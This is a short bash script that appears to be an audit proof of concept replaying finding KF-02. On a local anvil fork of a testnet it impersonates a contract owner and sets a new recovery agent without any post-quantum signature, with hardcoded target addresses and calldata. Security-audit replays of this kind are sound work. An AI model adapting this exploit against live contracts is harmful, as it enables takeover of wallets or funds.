#!/usr/bin/env bash
# Keyfall replay: KF-02 (High) — setRecoveryAgent(address) succeeds for owner() without any PQC signature
# Runs on a LOCAL fork only. Needs Foundry (anvil + cast).
set -euo pipefail
anvil --fork-url https://evm-testnet.qore.host --fork-block-number 10539201 --chain-id 9800 --port 8555 --silent & ANVIL=$!; trap "kill $ANVIL" EXIT; sleep 6
R=http://127.0.0.1:8555
cast rpc anvil_setCode 0x0000000000000000000000000000000000000a01 0x600060005260206000f3 --rpc-url $R >/dev/null  # reject: attacker has no ML-DSA-87 key
echo "target balance before: $(cast balance 0xCA9171c2D60A43F57FCaa23e7BBFDF2DD7D32254 --rpc-url $R)"
# step 1: setRecoveryAgent(address) as owner()
cast rpc anvil_impersonateAccount 0x3184924416dF6C43b4c66171fBc75121fF27465B --rpc-url $R >/dev/null
cast rpc anvil_setBalance 0x3184924416dF6C43b4c66171fBc75121fF27465B 0x3635c9adc5dea00000 --rpc-url $R >/dev/null
cast send --unlocked --from 0x3184924416dF6C43b4c66171fBc75121fF27465B 0xCA9171c2D60A43F57FCaa23e7BBFDF2DD7D32254 0x9bac766900000000000000000000000001b1bdf5851fa31cf0184685dbd6aa4f283b8e55 --gas-limit 15000000 --rpc-url $R >/dev/null
echo "target balance after:  $(cast balance 0xCA9171c2D60A43F57FCaa23e7BBFDF2DD7D32254 --rpc-url $R)"
echo "recoveryAgent(): $(cast call 0xCA9171c2D60A43F57FCaa23e7BBFDF2DD7D32254 'recoveryAgent()' --rpc-url $R)"
